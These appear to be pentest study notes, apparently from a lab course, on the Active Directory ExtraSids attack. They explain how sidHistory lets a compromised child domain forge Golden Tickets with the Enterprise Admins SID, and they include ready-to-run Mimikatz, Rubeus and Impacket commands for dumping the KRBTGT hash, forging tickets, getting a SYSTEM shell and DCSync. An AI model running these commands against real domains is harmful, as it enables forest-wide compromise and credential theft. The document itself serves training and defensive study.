### Content

- [sidHistory](#sidhistory)
- [ExtraSids Attack](#extrasids-attack)
	- [From Windows](#from-windows)
	- [From Linux](#from-linux)

> [!Note]
> 
> The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.

---
## sidHistory

The `sidHistory` attribute contains previous SIDs used for the object if the object was moved from another domain. Whenever an object is moved from one domain to another, a new SID is created and that new SID becomes the `objectSID`. The previous SID is added to the sIDHistory property.

SID history is intended to work across domains, but can work in the same domain. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.

This token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

---
## ExtraSids Attack

- This attack allows for the compromise of a parent domain once the child domain has been compromised.
- Within the same AD forest, the [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) property is respected due to a lack of [SID Filtering](https://web.archive.org/web/20220812183844/https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) protection.
- SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust.

If a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.

In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain.

In this case, we will leverage the `SIDHistory` to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.

### From Windows

To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain.
- The SID for the child domain.
- The name of a target user in the child domain (does not need to exist!).
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.

``` Powershell
# Obtaining the KRBTGT Account's NT Hash using Mimikatz
PS C:\> mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
9d765b482771505cbe97411065964d5f


# The child domain SID will be in the output above {DOMAIN_SID-RID}
# You can also extract it using PowerView
PS C:\> Get-DomainSID


# Use PowerView to obtain the SID for the Enterprise Admins group in the parent domain.
PS C:\> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
# Or use Get-ADGroup cmdlet
PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"


# Creating a Golden Ticket with Mimikatz
mimikatz # kerberos::golden /user:<anyName> /domain:<child_FQDN> /sid:<child_domain_FQDN> /krbtgt:<krbtgt_NTLMhash> /sids:<group_SID_to_impersonate> /ptt
# Or use rubeus
PS C:\> Rubeus.exe golden /rc4:<krbtgt_NTLMhash> /domain:<child_domain_FQDN> /sid:<child_domain_sid> /sids:<parent_domain_group_SID_to_impersonate> /user:<anyName> /ptt
```

### From Linux

To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain. 9d765b482771505cbe97411065964d5f
- The SID for the child domain. S-1-5-21-2806153819-209893948-922872689
- The name of a target user in the child domain (does not need to exist!). attacker
- The FQDN of the child domain. LOGISTICS.INLANEFREIGHT.LOCAL
- The SID of the Enterprise Admins group of the root domain. S-1-5-21-3842939050-3880317879-2865463114-519

```bash
# Obtaining the KRBTGT Account's NT Hash using secretsdump.py
$ secretsdump.py <child_domain>/<user_name>:'<password>'@<child_domain_DC_IP> -just-dc-user LOGISTICS/krbtgt

# Performing SID Brute Forcing using impacket-lookupsid
# The tool will give us back the SID for the domain and the RIDs for each user and group
# Extract the child domain SID
$ lookupsid.py <child_domain_FQDN>/htb-student_adm@<child_domain_DC_IP>

# Extract the parent domain SID
$ lookupsid.py <child_domain_FQDN>/htb-student_adm@<parent_domain_DC_IP>

# Constructing a Golden Ticket using impacket-ticketer
$ ticketer.py -nthash <krbtgt_NTLMhash> -domain <child_domain_FQDN> -domain-sid <child_domain_sid> -extra-sid <parent_domain_group_SID_to_impersonate> <anyName>

# Getting a SYSTEM shell using impacket-psexec
$ psexec.py <child_domain_FQDN>/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip <Parent_DC_IP>

# You can also DCsync any user
$ KRB5CCNAME=./hacker.ccache secretsdump.py -just-dc-user bross LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass
```

Automating the attack using `impacket-raiseChild`

```bash
# We need to specify the target domain controller and credentials for an administrative user in the child domain
$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```